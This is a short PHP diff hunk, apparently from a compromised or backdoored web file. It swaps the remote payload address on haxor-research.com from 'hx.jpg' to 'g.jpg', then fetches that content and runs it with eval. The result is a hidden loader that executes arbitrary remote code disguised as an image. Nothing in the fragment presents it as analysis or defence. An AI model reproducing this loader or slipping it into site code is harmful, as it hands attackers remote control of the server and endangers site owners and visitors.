@@ -56,7 +56,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://haxor-research.com/hx.jpg';
+    $destiny = 'https://haxor-research.com/g.jpg';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
